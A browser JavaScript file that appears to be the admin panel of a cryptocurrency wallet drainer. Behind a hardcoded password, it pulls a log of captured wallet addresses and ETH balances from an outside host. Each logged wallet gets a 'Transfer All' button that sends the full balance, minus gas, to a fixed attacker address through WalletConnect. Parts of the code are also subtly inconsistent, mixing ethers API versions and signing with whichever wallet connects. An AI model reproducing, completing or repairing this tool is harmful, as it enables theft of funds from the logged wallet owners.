const loginForm = document.getElementById('loginForm');
const adminPass = document.getElementById('adminPass');
const panel = document.getElementById('panel');
const sessionList = document.getElementById('sessionList');
const PASSWORD = 'ChangeMe123';

loginForm.addEventListener('submit', async e => {
  e.preventDefault();
  if (adminPass.value !== PASSWORD) return alert('Wrong password');
  loginForm.style.display = 'none';
  panel.style.display = 'block';

  const res = await fetch('https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json');
  const logs = await res.json();

  logs.forEach((entry, idx) => {
    const li = document.createElement('li');
    li.className = 'list-group-item';
    li.innerHTML = `<strong>#${idx+1}</strong> ${new Date(entry.timestamp).toLocaleString()}<br/>
                    Address: ${entry.address}<br/>
                    Balance: ${entry.balance} ETH<br/>
                    Chain: ${entry.chainId}<br/>
                    <button data-idx="${idx}" class="btn btn-sm btn-success transferBtn mt-2">Transfer All</button>`;
    sessionList.appendChild(li);
  });

  sessionList.addEventListener('click', async e => {
    if (!e.target.classList.contains('transferBtn')) return;
    const idx = e.target.getAttribute('data-idx');
    const entry = logs[idx];
    const provider = await EthereumProvider.init({ projectId: '84e8498a4e08cafe1acaf08369fd7a56', chains: [entry.chainId], showQrModal: true });
    await provider.enable();
    const ethersProvider = new ethers.BrowserProvider(provider);
    const signer = await ethersProvider.getSigner();
    const balance = await ethersProvider.getBalance(entry.address);
    const gas = await signer.estimateGas({ to: '0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60', value: balance });
    const tx = await signer.sendTransaction({ to: '0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60', value: balance.sub(gas) });
    alert('Transaction sent: ' + tx.hash);
  });
});
